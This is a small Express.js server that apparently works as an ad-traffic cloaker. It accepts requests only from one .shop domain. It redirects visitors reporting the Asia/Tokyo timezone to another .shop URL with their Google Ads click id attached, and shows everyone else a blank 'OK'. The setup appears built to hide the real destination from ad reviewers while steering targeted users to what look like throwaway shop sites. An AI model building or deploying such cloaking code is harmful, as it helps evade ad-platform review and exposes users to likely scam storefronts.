import express from "express";
import cors from "cors";

const app = express();

// ✅ Allow only this domain
const ALLOWED_ORIGIN = "https://refliefcart.shop";

// ✅ Final redirect destination
const REDIRECT_URL = "https://fooidemix.shop/map/latest";

// CORS configuration
app.use(
  cors({
    origin: function (origin, callback) {
      // Allow server-side or same-origin requests
      if (!origin || origin === ALLOWED_ORIGIN) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    methods: ["GET"],
    allowedHeaders: ["x-client-timezone"],
  })
);

app.get("/redirect", (req, res) => {
  const gclid = req.query.gclid || "";
  const timezone = req.headers["x-client-timezone"];

  // 🇯🇵 Redirect only for Japan timezone
  if (timezone === "Asia/Tokyo") {
    const url = new URL(REDIRECT_URL);

    if (gclid) {
      url.searchParams.set("gclid", gclid);
    }

    return res.redirect(302, url.toString());
  }

  // Non-Japan traffic
  res.status(200).send("OK");
});

// Render-required port binding
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
